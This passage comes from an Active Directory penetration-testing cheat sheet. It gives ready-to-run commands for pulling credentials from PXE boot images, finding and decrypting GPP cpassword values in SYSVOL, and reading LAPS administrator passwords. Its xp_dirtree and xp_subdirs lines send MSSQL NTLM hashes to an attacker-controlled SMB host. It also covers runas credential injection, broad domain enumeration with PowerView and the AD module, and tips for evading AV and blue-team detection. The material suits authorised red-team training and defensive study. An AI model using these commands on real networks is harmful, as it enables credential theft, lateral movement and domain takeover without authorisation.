<span class="p">&lt;</span><span class="n">PXE</span> <span class="n">Boot</span> <span class="n">Image</span> <span class="n">Location</span><span class="p">&gt;</span>
</code></pre></div>
<p>3 - Retrieve the WIM File with the TFTP client:</p>
<div class="highlight"><pre><span></span><code>tftp<span class="w"> </span>-i<span class="w"> </span>&lt;MDT<span class="w"> </span>Server<span class="w"> </span>IP&gt;<span class="w"> </span>GET<span class="w"> </span><span class="s2">"&lt;PXE Boot Image Location&gt;"</span><span class="w"> </span>pxeboot.wim
</code></pre></div>
<p>4 - Use <code>PowerPXE</code> to extract the credentials stored within the WIMFile:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-FindCredentials</span> <span class="n">-WimFile</span> <span class="n">pxeboot</span><span class="p">.</span><span class="n">wim</span>
</code></pre></div>
<p>Useful Resources:</p>
<ul>
<li><a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE</a></li>
<li><a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">Taking over Windows Workstations thanks to LAPS and PXE</a></li>
</ul>
<h4 id="mitigations_3">Mitigations</h4>
<ul>
<li>To avoid an attacker with access to the corporate network booting into PXE, it is strongly recommended that the ability to boot this way is limited to specific network areas, such as dedicated rooms with physical access control.</li>
<li>It is also recommended to require a password before starting the deployment. This can be configured by checking the "<em>Require a Password when computers use PXE</em>" checkbox in the SCCM configuration.</li>
<li>Follow Microsoft's recommendations for deploying PXE,</li>
</ul>
<h3 id="group-policy-preferences-gpp_1">Group Policy Preferences - GPP</h3>
<p>Microsoft implemented a method to change local administrator accounts across workstations using <strong>Group Policy Preferences (GPP)</strong>. Until 2015, GPP relevant XML files, such as <strong>Groups.xml</strong>, were stored in the SYSVOL. These files contain encrypted passwords using AES-256 bit encryption:</p>
<ul>
<li>The password is stored in the <strong>cPassword</strong> field.</li>
</ul>
<p>There are other files that can contain encrypted passwords:</p>
<ul>
<li>Groups.xml</li>
<li>Services.xml </li>
<li>Scheduledtasks.xml </li>
<li>DataSources.xml </li>
<li>Printers.xml </li>
<li>Drives.xml</li>
</ul>
<p>At that time, the encryption was good enough until Microsoft somehow published its private key making easy to decrypt the stored passwords.</p>
<ul>
<li><strong>Even though the issue has been fixed, the patch is not retroactive for existing users</strong></li>
</ul>
<p>Find GPP Passwords in SYSVOL:</p>
<div class="highlight"><pre><span></span><code>findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w"> </span><span class="nv">$env</span>:logonserver<span class="se">\s</span>ysvol<span class="se">\*</span>.xml<span class="w"> </span><span class="c1"># Powershell</span>
findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w"> </span>%logonserver%<span class="se">\s</span>ysvol<span class="se">\*</span>.xml<span class="w"> </span><span class="c1"># CMD</span>
</code></pre></div>
<p>Find and decrypt GPP passwords remotely with <code>impacket</code>'s <code>Get-GPPPassword</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-Get-GPPPassword<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>@<span class="s1">'&lt;target dc&gt;'</span>
</code></pre></div>
<p>Find and decrypt GPP passwords remotely with <code>nxc</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>gpp_password
</code></pre></div>
<p>If some GPP relevant file is obtained from SYSVOL, it's possible to crack every password entry with the following command:</p>
<div class="highlight"><pre><span></span><code>gpp-decrypt<span class="w"> </span>&lt;cPassword&gt;
</code></pre></div>
<p>If previous command does not work correctly, try this bash script <a href="https://gist.githubusercontent.com/rmrt1n/f1b01a4017036514cc2aac654f372fc7/raw/ce17d39c26f58c9543ba0848a59aa67e9baf5522/gpp-decrypt.sh">gpp-decrypt.sh</a>:</p>
<div class="highlight"><pre><span></span><code>gpp-decrypt.sh<span class="w"> </span>&lt;cPassword&gt;
</code></pre></div>
<p>Moreover, the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a> from PowerSploit exfiltrates and cracks GPP passwords:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-GPPPassword</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">passwords</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Uniq</span>
</code></pre></div>
<p>Consider also trying Metasploit <code>auxiliary/scanner/smb/smb_enum_gpp</code> module.</p>
<h3 id="local-administrator-password-solution-laps">Local Administrator Password Solution (LAPS)</h3>
<p>In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the <strong>Local Administrator Password Solution (LAPS),</strong> which offers a much more secure approach to remotely managing the local administrator password.
LAPS includes two new attributes of computer objects in the Active Directory:</p>
<ul>
<li><code>ms-mcs-AdmPwd</code>: contains a clear-text password of the local administrator. By default, it can only be viewed by Domain Admins , and unlike other attributes, is not accessible by Authenticated Users.</li>
<li><code>ms-mcs-AdmPwdExpirationTime</code>: contains the expiration time to reset the password. </li>
</ul>
<p>LAPS uses <code>admpwd.dll</code>, usually located at <code>C:\Program Files\LAPS\CSE</code> to change the local administrator password and update the value of <code>ms-mcs-AdmPwd</code>.</p>
<p>The <code>Find-AdmPwdExtendedRights</code> from the <code>AdmPwd.PS</code> module can list all groups with rights to read the <code>ms-mcs-AdmPwd</code>. If the attacker controls an user that belongs to one of these groups, him can access to the local Administrator password.</p>
<p>Moreover, when a machine joins a domain, an object of the class &ldquo;computer&rdquo; is created in the Active Directory. The user account used to create this object, i.e. joining a machine, is defined as the <strong>owner</strong> of this object.
The owner of an object, inherited from the class &ldquo;computer&rdquo;, has by default the privilege <code>ExtendedRight</code> (<code>All extended rights</code>in the GUI) that allows access to the LAPS password. If the attacker controls an user with the <code>ExtendedRight</code> privilege, him can access to the local Administrator password.</p>
<p><strong>Note</strong>: often a dedicated service account is used to join machines to domain; if LAPS is broadly used across various workstations with the same service account used to join to the domain, compromising this service accounts can compromise all the workstations's local Administrators.</p>
<p>Import <code>AdmPwd.PS</code> module, if not imported:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="n">AdmPwd</span><span class="p">.</span><span class="nb">PS</span>
</code></pre></div>
<p>Find groups with privileges to access the <code>ms-mcs-AdmPwd</code> attribute:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Find-AdmPwdExtendedRights</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">OU</span> <span class="n">or</span> <span class="p">*&gt;</span>
</code></pre></div>
<p>If any group is returned, check groups members:</p>
<div class="highlight"><pre><span></span><code><span class="n">net</span> <span class="n">groups</span> <span class="s2">"&lt;found group&gt;"</span>
</code></pre></div>
<p>From a compromised user part of one of the previous groups, get the content of the<code>ms-mcs-AdmPwd</code> attribute:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-AdmPwdPassword</span> <span class="n">-Computer</span> <span class="n">Name</span> <span class="p">&lt;</span><span class="n">local</span> <span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>

<span class="c"># Or using PowerView</span>
<span class="nb">Get-DomainComputer</span> <span class="p">&lt;</span><span class="n">Computer</span> <span class="n">Name</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">ms-mcs-AdmPwd</span><span class="p">,</span><span class="n">ComputerName</span><span class="p">,</span><span class="n">ms-mcs-AdmPwdExpirationTime</span>
</code></pre></div>
<p>Alternatively, check if any of the compromised accounts is the owner of the "computer" object in the AD (i.e. is the account used to join the computer to the domain) and therefore has the <code>ExtendedRights</code> privilege:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-module</span> <span class="n">ActiveDirectory</span>

<span class="c">## Extract the default configuration for a "computer" object</span>
<span class="nv">$computerobject</span> <span class="p">=</span> <span class="nb">Get-ADObject</span> <span class="n">-SearchBase</span> <span class="p">(</span><span class="nb">Get-ADRootDSE</span><span class="p">).</span><span class="n">SchemaNamingContext</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s2">"Computer"</span> <span class="p">}</span> <span class="n">-Properties</span> <span class="n">defaultSecurityDescriptor</span>

<span class="c">## Create an object allowing managing the ACLs</span>
<span class="nv">$sec</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectorySecurity</span>

<span class="nv">$sec</span><span class="p">.</span><span class="n">SetSecurityDescriptorSddlForm</span><span class="p">(</span><span class="nv">$computerobject</span><span class="p">.</span><span class="n">defaultSecurityDescriptor</span><span class="p">)</span>

<span class="c">## List the privileges of the object owneer</span>
<span class="nv">$acc</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">"CREATOR OWNER"</span><span class="p">)</span> <span class="c">## Note: the principal name may be different if AD is installed with another language</span>

<span class="nv">$sec</span><span class="p">.</span><span class="n">GetAccessRules</span><span class="p">(</span><span class="nv">$true</span><span class="p">,</span><span class="nv">$false</span><span class="p">,</span><span class="no">[System.Security.Principal.NTAccount]</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-eq</span> <span class="nv">$acc</span><span class="p">}</span>
</code></pre></div>
<p>If in the resulting info there's the <code>Extended Right</code> privilege corresponding to the <code>ActiveDirectoryRights</code> attribute, then the account can read the <code>ms-mcs-AdmPwd</code> attribute.</p>
<p>Another useful tool is <a href="https://github.com/leoloobeek/LAPSToolkit">LAPS Toolkit</a>.</p>
<p>References:</p>
<ul>
<li><a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">Taking over workstation thanks to LAPS</a></li>
</ul>
<h3 id="mssql-ntlm-hash-dump">MSSQL NTLM hash dump</h3>
<p>Having access to a MSSQL session, if the current service account can use <code>xp_dirtree</code>, <code>xp_fileexist</code> or <code>xp_subdirs</code> stored procedures, it could be possible to capture the MSSQL service account's NTLM hash by setting up an SMB share using Impacket's <code>smbserver</code>. </p>
<ul>
<li>These stored procedures are used to list files and directories in a folder. By setting this target folder to the Impacket's <code>smbserver</code>, the NTLM hash will be passed to it.</li>
</ul>
<p>If the MSSQL service is running under a high-privilege account (such as Domain Admin or Local Admin) and the password is weak (quite common), it could be possible to crack
the password and perform a lateral movement or gain access to the whole Active Directory.</p>
<p>Run <code>xp_dirtree</code> or <code>xp_subdirs</code> stored procedures:</p>
<div class="highlight"><pre><span></span><code>xp_dirtree<span class="w"> </span><span class="s1">'\\&lt;attacker_IP&gt;\any\thing'</span>
<span class="nb">exec</span><span class="w"> </span>master.dbo.xp_dirtree<span class="w"> </span><span class="s1">'\\&lt;attacker_IP&gt;\any\thing'</span>
EXEC<span class="w"> </span>master..xp_subdirs<span class="w"> </span><span class="s1">'\\&lt;attacker_IP&gt;\anything\'</span>
EXEC<span class="w"> </span>master..xp_fileexist<span class="w"> </span><span class="s1">'\\&lt;attacker_IP&gt;\anything\'</span>
</code></pre></div>
<p>Relay NTLM as for SMB Relay.</p>
<h2 id="enumeration_1">Enumeration</h2>
<h3 id="network-credentials-injection">Network Credentials Injection</h3>
<p>Often, in security assessments, you will have network access and have just discovered AD credentials but have no means or privileges to create a new domain-joined machine. So we need the ability to use those credentials on a Windows machine we control.</p>
<p>With the command <code>runas</code> is possible to inject the discovered AD credentials in memory and then <strong>use them for network level authentication</strong> (Kerberos or NTLM) and interact with domain services even though the machine is not joined to the domain.</p>
<div class="highlight"><pre><span></span><code>runas.exe<span class="w"> </span>/netonly<span class="w"> </span>/user:&lt;domain&gt;<span class="se">\&lt;</span>username&gt;<span class="w"> </span>cmd.exe
</code></pre></div>
<ul>
<li><strong>/netonly</strong> - Commands are executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.</li>
<li><strong>/user</strong> - The details of the domain and the username. It is always a safe bet to use the <strong>Fully Qualified Domain Name (FQDN)</strong> instead of just the <strong>NetBIOS</strong> name of the domain since this will help with resolution.</li>
<li><strong>cmd.exe</strong> - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since allows then to launch any other program with the credentials injected.</li>
</ul>
<p><strong>Note</strong>: it's always helpful to run the first cmd as Administrator since this will inject and Administrative token in the CMD. <strong>This DOES NOT give you administrative privileges on the network</strong>, it just ensure that any <strong>local</strong> command gets executed with administrative privileges.</p>
<p>Once the previous <code>runas</code> command get executed, the network credential gets injected into memory; all network communication generate from application executed from the opened command line terminal will use these injected credentials for authentication.
For example, it's possible to run the <strong>Microsoft Management Console (MMC)</strong> and visually enumerate forests, domain, OUs, and objects. </p>
<p>Another example is to launch <code>sharphound</code> from the attacker-controlled machine with the credentials injected; this allows to circumvent the problem of AVs blocking <code>sharphound</code>, <strong>even though, it remains a noisy tool and it can still be detected by blue teams</strong>. </p>
<ul>
<li>If MMC is not installed, enable <strong>Remote Server Administraton Tools (RSAT)</strong> from control panel.</li>
</ul>
<p>Enumeration with the Microsoft Management Console (MMC):</p>
<div class="highlight"><pre><span></span><code>mmc.exe<span class="w"> </span><span class="c1"># eventually run in previous runas cmd terminal</span>
</code></pre></div>
<p>In MMC:</p>
<ol>
<li>Click <strong>File</strong> -&gt; <strong>Add/Remove Snap-in</strong></li>
<li>Select and <strong>Add</strong> all three Active Directory Snap-ins</li>
<li>Click through any errors and warnings  </li>
<li>Right-click on <strong>Active Directory Domains and Trusts</strong> and select <strong>Change Forest</strong></li>
<li>Enter the target domain as the <strong>Root domain</strong> and Click <strong>OK</strong></li>
<li>Right-click on <strong>Active Directory Sites and Services</strong> and select <strong>Change Forest</strong></li>
<li>Enter target domain as the <strong>Root domain</strong> and Click OK</li>
<li>Right-click on <strong>Active Directory Users and Computers</strong> and select <strong>Change Domain</strong></li>
<li>Enter target domain as the <strong>Domain</strong> and Click <strong>OK</strong></li>
<li>Right-click on <strong>Active Directory Users and Computers</strong> in the left-hand pane  </li>
<li>Click on <strong>View</strong> -&gt; <strong>Advanced Features</strong></li>
</ol>
<h4 id="force-ntlm-authentication-over-kerberos">Force NTLM Authentication over Kerberos</h4>
<p>When the <strong>hostname</strong> is provided, network authentication will attempt first to perform Kerberos authentication since Kerberos authentication uses hostnames embedded in the tickets. 
- <strong>if the IP is instead provided, it's possible to force the authentication type to be NTLM</strong>.</p>
<p>In some scenarios, this can be useful to avoid detection.</p>
<h3 id="sysvol_1">SYSVOL</h3>
<p><strong>SYSVOL</strong> is a folder that exists on all domain controllers. It is a shared folder storing the <strong>Group Policy Objects (GPOs)</strong> and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.</p>
<ul>
<li><strong>Any AD account, no matter how low-privileged, can read the contents of the SYSVOL directory.</strong></li>
</ul>
<p>It is good to enumerate its contents since there may be some additional AD credentials or other useful information in there.</p>
<h3 id="dns-enumeration">DNS Enumeration</h3>
<p>Enumerate DC ip by querying DNS:</p>
<div class="highlight"><pre><span></span><code>nslookup<span class="w"> </span>-type<span class="o">=</span>srv<span class="w"> </span>_ldap._tcp.dc._msdcs.&lt;domain&gt;<span class="w"> </span>&lt;dns<span class="w"> </span>server&gt;
</code></pre></div>
<p>By default any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer .</p>
<p>Dump DNS record from DC with <a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a>:</p>
<div class="highlight"><pre><span></span><code>adidnsdump<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;domain&gt;\&lt;user&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>&lt;target<span class="w"> </span>host&gt;
</code></pre></div>
<h3 id="command-line-powershell-enumeration">Command Line &amp; Powershell Enumeration</h3>
<p>CMD has a built-in command that we can use to enumerate information about AD, namely <code>net</code>. The <code>net</code> command is a handy tool to enumerate information about the local system and AD.
No additional or external tooling is required, and  <code>net</code> commands are often not monitored for by the Blue team. However,  <code>net</code> commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
Moreover,  <code>net</code> commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.</p>
<p>PowerShell permits to obtain more complex enumeration results thanks to his <strong>cmdlets</strong> within the <strong>Active Directory Module</strong> generally installed via <em>RSAT</em> toolkit*. Moreover, various advanced enumeration cmdlets exists, such as the  <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView</a> script, part of the "Recon" module of the <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> collection. A .NET port for <code>PowerSploit</code> is <a href="https://github.com/cobbr/SharpSploit">SharpSploit</a>.
Another alternative is <a href="https://github.com/adrecon/ADRecon">ADRecon</a>.</p>
<ul>
<li>Using <strong>Active Directory Module</strong> there are very low chances of detection by AV, very wide coverage by cmdlets, good filters for cmdlets, signed by Microsoft etc. </li>
<li>However, PowerShell is often monitored more by the blue teams than Command Prompt and the AD-RSAT tooling need to be installed. The alternative is to use other, potentially detectable, enumeration scripts.</li>
<li>PowerSploit has been deprecated and is no longer mantained!</li>
</ul>
<p>*Note: If <em>RSAT</em> is not available, it's possible to directly import the Active Directory Module's DLL with the <code>Import-Module</code> PowerShell cmdlet. <strong>This operation does NOT require elevated privileges</strong>.</p>
<p>A more manual enumeration is possible by using  powershell's <strong>Windows Management Instrumentation (WMI)</strong> cmdlet. WMI is the infrastructure for management data and operations on Windows-based operating systems generally used to automate administrative tasks on remote computers.
WMI has a provider called <code>root\directory\ldap</code> which can be used for interaction with the active directory environment. Each class contained in this is provider is prefixed; each prefix has a meaning:</p>
<ul>
<li>Classes with <code>ds_</code> prefix are dynamic. These classes are the only ones useful to us since they allow retrieval of instances.</li>
<li>Classes with <code>ads_</code> prefix are abstract.</li>
<li>Classes with <code>win32_</code> prefix contain data about processes, users, groups, events, etc.</li>
</ul>
<p>*Note: by default WMI provides remote access only to <strong>local administrators</strong>. In order to run WMI commands against a remote computer, the user used must be also a local administrator on the remote computer.</p>
<h4 id="command-line-enumeration">Command Line Enumeration</h4>
<p>List all registered SPNs in a DC:</p>
<div class="highlight"><pre><span></span><code>setspn<span class="w"> </span>-T<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-Q<span class="w"> </span>*/*
</code></pre></div>
<p>Enumerate all users in the AD:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>/domain
</code></pre></div>
<p>Get details about a user in the AD:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>/domain
</code></pre></div>
<p>Enumerate all groups in the AD:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>group<span class="w"> </span>/domain
</code></pre></div>
<p>Get details about a group in the AD:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>group<span class="w"> </span>&lt;group&gt;<span class="w"> </span>/domain
</code></pre></div>
<p>Get details about domain password policy:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>accounts<span class="w"> </span>/domain
</code></pre></div>
<p>List applied GPO:</p>
<div class="highlight"><pre><span></span><code>gpresult<span class="w"> </span>/R<span class="w"> </span>/V<span class="w"> </span>
</code></pre></div>
<h4 id="powershell-enumeration">Powershell Enumeration</h4>
<p>Get domain information:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetDomain</span> <span class="p">[</span><span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;]</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADDomain</span> <span class="p">[</span><span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;]</span>
</code></pre></div>
<p>Get domain SID:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-DomainSID</span>

<span class="c"># AD Module</span>
<span class="p">(</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">DomainSID</span>
</code></pre></div>
<p>Get a list of all operating systems on the domain: </p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetComputer</span>
<span class="nb">Get-NetComputer</span> <span class="n">-OperatingSytem</span> <span class="s2">"*Server 2019*"</span>
<span class="nb">Get-NetComputer</span> <span class="n">-Ping</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span>
<span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="s1">'OperatingSystem -like "*Server 2016*"'</span> <span class="n">-Properties</span> <span class="n">OperatingSystem</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span><span class="n">OperatingSystem</span>
<span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="n">DNSHostName</span> <span class="p">|</span> <span class="p">%{</span><span class="nb">Test-Connection</span> <span class="n">-Count</span> <span class="n">1</span> <span class="n">-ComputerName</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DNSHostName</span><span class="p">}</span> <span class="c"># Ping</span>
</code></pre></div>
<p><strong>Note</strong>: the existence of a computer object does not necessarily imply that in the network this computer really exists i.e. it could be just be an object in the LDAP but not mapped with a real computer or VM.</p>
<p>Gets a list of all users on the domain (<code>PowerView</code>):</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span>
</code></pre></div>
<p>Get list of admin domain users:</p>
<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">adminCount</span>
</code></pre></div>
<p>Get details about a user in the AD:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">-Server</span> <span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="p">*</span>
</code></pre></div>
<p>Get user last set date for password:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="n">-Properties</span> <span class="n">cn</span><span class="p">,</span><span class="n">pwdlastset</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,@{</span><span class="n">expression</span><span class="p">={</span><span class="no">[datetime]</span><span class="p">::</span><span class="n">fromFileTime</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">pwdlastset</span><span class="p">)}}</span>
</code></pre></div>
<p>Get user wrong password count:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="n">-Properties</span> <span class="n">cn</span><span class="p">,</span><span class="n">badpwdcount</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">badpwdcount</span>
</code></pre></div>
<p>Get the list of all available users' properties:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-First</span> <span class="n">1</span> <span class="p">|</span> <span class="nb">Get-Member</span> <span class="n">-MemberType</span> <span class="s2">"*Property"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-First</span> <span class="n">1</span> <span class="p">|</span> <span class="nb">Get-Member</span> <span class="n">-MemberType</span> <span class="s2">"*Property"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span>
</code></pre></div>
<p>Search user by property:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">where </span><span class="n">-Property</span> <span class="n">Description</span> <span class="o">-Like</span> <span class="s2">"*built*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">description</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">'Description -like "*something*"'</span> <span class="n">-Properties</span> <span class="n">Description</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">description</span>
</code></pre></div>
<p>Check whether the current user has local admin access on a computer:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Find-LocalAdminAccess</span> <span class="n">-Verbose</span> <span class="c"># Automated: uses Invoke-CheckLocalAdminAccess for every machine on the current domain</span>

<span class="c"># PowerView</span>
<span class="nb">Invoke-CheckLocalAdminAccess</span> <span class="n">-Computer</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span>

<span class="c"># Useful when RPC and SMB, generally used by Find-LocalAdminAccess, are blocked</span>
<span class="nb">Find-WMILocalAdminAccess</span>
<span class="nb">Find-WMILocalAdminAccess</span> <span class="n">-ComputerFile</span> <span class="p">.\</span><span class="n">computers</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Verbose</span>
<span class="nb">Find-PSRemotingLocalAdminAccess</span> 
</code></pre></div>
<ul>
<li><a href="https://github.com/RedTeamMagic/Powershell/blob/main/Find-WMILocalAdminAccess.ps1">Find-WMILocalAdminAccess.ps1</a></li>
<li><a href="https://github.com/RedTeamMagic/Powershell/blob/main/Find-PSRemotingLocalAdminAccess.ps1">Find-PSRemotingLocalAdminAccess.ps1</a></li>
</ul>
<p><strong>Note</strong>: running those script for chunks of machines instead of a single run (all domain machines) can lower the chances to be detected since they generate an high  activity.</p>
<p>Find local admins on all machines of the domain (needs administrator privs on non-dc machines:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Invoke-EnumerateLocalAdmin</span> <span class="n">-Verbose</span> <span class="c"># Automated: uses Get-NetLocalGroup on every computer in the domain</span>
</code></pre></div>
<p>Find computers where a domain admin (or specified user/group) has sessions:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Invoke-UserHunter</span> <span class="c"># Automated: queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list of computers ( Get-NetComputer) and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.</span>
<span class="nb">Invoke-UserHunter</span> <span class="n">-GroupName</span> <span class="s2">"RDPUsers"</span>
<span class="nb">Invoke-UserHunter</span> <span class="n">-CheckAccess</span> <span class="c"># To confirm admin access</span>
<span class="nb">Invoke-UserHunter</span> <span class="n">-Stealth</span> <span class="c"># it goes for high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation</span>
</code></pre></div>
<p>Enumerate domain groups:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetGroup</span>
<span class="nb">Get-NetGroup</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">targetdomain</span><span class="p">&gt;</span>
<span class="nb">Get-NetGroup</span> <span class="n">-GroupName</span> <span class="s2">"*admin*"</span>
<span class="nb">Get-NetLocalGroup</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">name</span><span class="p">&gt;</span> <span class="c"># Local group (needs admin privs on non-dc machine)</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADGroup</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span>
<span class="nb">Get-ADGroup</span> <span class="n">-Filter</span> <span class="s1">'Name -like "*admin*"'</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span>
</code></pre></div>
<p>Enumerate <strong>domain</strong> groups membership:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetGroupMember</span> <span class="n">-Identity</span> <span class="s2">"Domain Admins"</span> <span class="n">-Recurse</span> <span class="c"># By group</span>
<span class="nb">Get-NetGroup</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="c"># By username</span>

